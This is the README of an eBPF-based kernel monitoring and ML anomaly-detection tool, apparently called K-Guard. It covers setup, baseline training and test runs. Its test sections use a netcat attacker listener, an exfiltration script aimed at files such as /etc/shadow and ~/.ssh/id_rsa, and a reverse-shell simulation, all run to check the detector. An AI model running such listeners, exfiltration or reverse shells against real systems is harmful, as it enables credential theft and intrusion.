# K-Guard Pipeline

An interactive kernel-space runtime monitoring and behavioral visualization pipeline driven by eBPF, `libbpf`, and NetworkX.

## Prerequisites

Install the required system build dependencies and generate the `vmlinux.h` header file from your running kernel:

```bash
sudo apt update
sudo apt install -y clang llvm libbpf-dev libelf-dev build-essential bpftool python3-pip
pip3 install -r requirements.txt

# Generate the kernel definition header
mkdir include && bpftool btf dump file /sys/kernel/btf/vmlinux format c > include/vmlinux.h
```

## Compilation
```
make clean && make
```

## Execution
```
sudo ./monitor | python3 src/user/graphengine.py
```

## Viewing the live Topology

The engine auto-saves updates to disk every 5 seconds under `output/`. Open the generated interactive
standalone webpage from that directory.

On Linux: 
```
xdg-open output/kguard_interactive_graph.html
```
On macOS:
```
open output/kguard_interactive_graph.html
```

## Training the Baseline Model

Before `ml/detector.py` can flag anomalies meaningfully, it needs a trained
baseline of normal activity. Do this once, and again whenever usage
patterns change.

### 1. Capture clean sessions

Run the monitor through different non-attack workloads (idle, dev work,
updates, installs, etc.) — never while an attack simulation is running.
Save each capture under a unique name (the monitor overwrites the same
file every run):

```bash
mkdir -p output/baseline_captures
cp output/system_behavior_graph.gexf output/baseline_captures/session_$(date +%Y%m%d_%H%M%S)_idle.gexf
```

Aim for 4+ sessions across different workload types.

### 2. Train

```bash
# regular
python3 -m ml.train

# force-promote this run even if it looks worse than the current model
python3 -m ml.train --force
```

Models are saved under `ml/models/`. A new run only replaces the active
`baseline_model.joblib` if it's at least as good as the current one;
`--force` overrides that check.

### Full test run (capture → attack → detect)

Run these **sequentially**, each in its own terminal:

```bash
# Terminal 1 — start the capture pipeline
sudo ./monitor | python3 src/user/graphengine.py
```

```bash
# Terminal 2 — start the attacker's listener
nc -lvnp 9999
```

```bash
# Terminal 3 — run the exfiltration simulation
python3 script/exfil.py
```
For custom attacker's ip, attacker's port and file, use following command:
```
python3 script/exfil.py --ip <custom_IP> --port <custom_PORT> --file <custom_file (For ex: /etc/shadow, /etc/passwd, ~/.ssh/id_rsa)>
```
Wait for `exfil.py` to print `[+] Exfiltration complete.`, then go back to **Terminal 1** and
press `Ctrl+C` to stop the monitor and flush the final graph to
`output/system_behavior_graph.gexf`.

Finally, run the detector:

```bash
python3 -m ml.detector
```
`ml/detector.py` automatically loads `ml/models/baseline_model.joblib`
### For Reverse Shell Simulation (capture → attack → detect) using KGUARD-GUI
```bash
# Terminal 1 — start the Kguard-gui
python3 kguard_gui.py
```
Click "Start Monitor"

```bash
# Terminal 2 — start the attacker's listener
nc -lvnp 9999
```

```bash
# Terminal 3 — run the reverse shell simulation
python3 script/revsh.py
```
Back to the K-Guard GUI, Click "Stop & Save Graph".
Detect the attack by clicking "Run ML Detector"